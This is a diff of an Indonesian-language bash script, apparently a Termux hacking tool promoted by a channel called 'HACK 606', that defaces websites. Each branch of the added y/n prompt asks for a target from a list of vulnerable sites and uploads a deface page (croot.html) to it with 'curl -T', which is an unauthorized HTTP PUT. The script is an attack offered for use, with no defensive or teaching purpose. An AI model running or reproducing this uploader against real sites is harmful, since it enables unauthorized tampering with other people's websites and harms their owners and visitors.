@@ -25,19 +25,40 @@ echo "♥ Sabar bosss..." | lolcat
 sleep 3
 echo "♥ Jika Belum Punya Web Vuln Ambil di webvuln-01.txt" | lolcat
 sleep 2
-
-echo "♥ Website Target : " $target |lolcat
-read target
-echo "♥ LOADING..." | lolcat
-sleep 2
-echo "♥ Masukin Scriptnya (croot.html) : " $sc |lolcat
-read sc
-curl -T /storage/emulated/0/$sc $target
-echo "♥ Cek Websitenya croot.html" | lolcat
-sleep 2
-echo "♥ Croot... " | lolcat
-sleep 20
-clear
-echo "subscribe my chanel HACK 606" | lolcat
-sleep 5
-clear
+echo "♥ Ambil web vuln?" | lolcat
+    echo "╭─y/n?" | lolcat
+    read -p "╰─#" pill;
+    if [ $pill = "y" ]; then
+            nano webvuln-01.txt
+           echo "♥ Website Target : " $target |lolcat
+           read target
+           echo "♥ LOADING..." | lolcat
+           sleep 2
+           echo "♥ Masukin Scriptnya (croot.html) : " $sc |lolcat
+           read sc
+           curl -T /storage/emulated/0/$sc $target
+           echo "♥ Cek Websitenya croot.html" | lolcat
+           sleep 2
+           echo "♥ Croot... " | lolcat
+           sleep 20
+           clear
+           echo "subscribe my chanel HACK 606" | lolcat
+           sleep 5
+           clear
+    else
+           echo "♥ Website Target : " $target |lolcat
+           read target
+           echo "♥ LOADING..." | lolcat
+           sleep 2
+           echo "♥ Masukin Scriptnya (croot.html) : " $sc |lolcat
+           read sc
+           curl -T /storage/emulated/0/$sc $target
+           echo "♥ Cek Websitenya croot.html" | lolcat
+           sleep 2
+           echo "♥ Croot... " | lolcat
+           sleep 20
+           clear
+           echo "subscribe my chanel HACK 606" | lolcat
+           sleep 5
+           clear
+    fi
